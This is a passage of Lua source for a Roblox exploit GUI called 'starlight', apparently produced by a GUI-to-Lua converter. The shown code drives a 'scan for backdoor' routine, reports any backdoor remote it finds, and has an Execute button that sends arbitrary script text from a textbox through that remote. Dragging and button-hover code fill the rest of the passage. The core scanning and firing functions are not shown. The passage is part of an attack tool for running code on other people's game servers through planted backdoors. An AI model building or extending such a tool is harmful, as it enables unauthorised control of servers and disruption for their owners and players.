		showNotification("starlight 💫", "scanning...", 99)
		task.spawn(findRemote)
		script.Parent.Framee.scan.Visible = false
		script.Parent.Framee.Check.Visible = true
		script.Parent.stat.ImageColor3 = Color3.fromRGB(255, 184, 71)
	
	
		repeat task.wait() until FinishedFound or remoteEvent or remoteFunction
		repeat task.wait() until FinishedFound
	
		if remoteEvent or remoteFunction then
			script.Parent.Framee.Check.Visible = false
			script.Parent.Framee.Log.Visible = true
			script.Parent.Framee.Log.Text = "backdoor: " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "unknown")
			showNotification("starlight 💫", "backdoor found!\ntime taken: " .. string.format("%.2f", scanTime) .. "\nbackdoor: " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "unknown"), 5)
	
			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
	
		else
			showNotification("starlight 💫", "backdoor not found!", 2)
			script.Parent.Framee.Check.Text = "backdoor not found!"
			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
			wait(3)
			script.Parent.Framee.scan.Visible = true
			script.Parent.Framee.Check.Visible = false
			script.Parent.Framee.Check.Text = "scanning for backdoor..."
		end
	
		scanning = false
	end)
	script.Parent.Framee.Execute.MouseButton1Click:Connect(function()
		showNotification("starlight 💫", "trying to run script...", 8)
		fireRemoteEvent(script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text)
	end)
end
local function CLINQ_fake_script() -- Fake Script: StarterGui.Starlight.str.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_str"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
local function IEZZYTQ_fake_script() -- Fake Script: StarterGui.Starlight.str.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_str"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local button = script.Parent
	local frame = button.Parent.Parent
	
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(22,22,22)
		button.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(16,16,16)
		button.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	button.MouseButton1Down:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(10,10,10)
		button.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	button.MouseButton1Up:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(16,16,16)
		button.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end

coroutine.wrap(OANEA_fake_script)()
coroutine.wrap(KKMF_fake_script)()
coroutine.wrap(QASF_fake_script)()
coroutine.wrap(VDVLDTM_fake_script)()
coroutine.wrap(KBLRU_fake_script)()
coroutine.wrap(YZIA_fake_script)()
coroutine.wrap(GUGA_fake_script)()
coroutine.wrap(AJLB_fake_script)()
coroutine.wrap(GWBAQWF_fake_script)()
coroutine.wrap(DTTILH_fake_script)()
coroutine.wrap(EFZHJXR_fake_script)()
coroutine.wrap(ZEKZH_fake_script)()
coroutine.wrap(JKMQNVT_fake_script)()
coroutine.wrap(URTEXBY_fake_script)()
coroutine.wrap(KTBMNUU_fake_script)()
coroutine.wrap(DCXHTW_fake_script)()
coroutine.wrap(HAPBIMG_fake_script)()
coroutine.wrap(TYZR_fake_script)()
coroutine.wrap(TXEYOPU_fake_script)()
coroutine.wrap(YNCXLWZ_fake_script)()
coroutine.wrap(XTWHDO_fake_script)()
coroutine.wrap(TBHOZTE_fake_script)()
coroutine.wrap(VTASMP_fake_script)()
coroutine.wrap(PLKZZOR_fake_script)()
coroutine.wrap(BWQCRM_fake_script)()
coroutine.wrap(IKQCZT_fake_script)()
coroutine.wrap(GDFUP_fake_script)()
coroutine.wrap(FIUUFGW_fake_script)()
coroutine.wrap(STVZ_fake_script)()
coroutine.wrap(DKHCTC_fake_script)()
coroutine.wrap(NVOZR_fake_script)()
coroutine.wrap(ZXOSLR_fake_script)()
coroutine.wrap(CLINQ_fake_script)()
coroutine.wrap(IEZZYTQ_fake_script)()
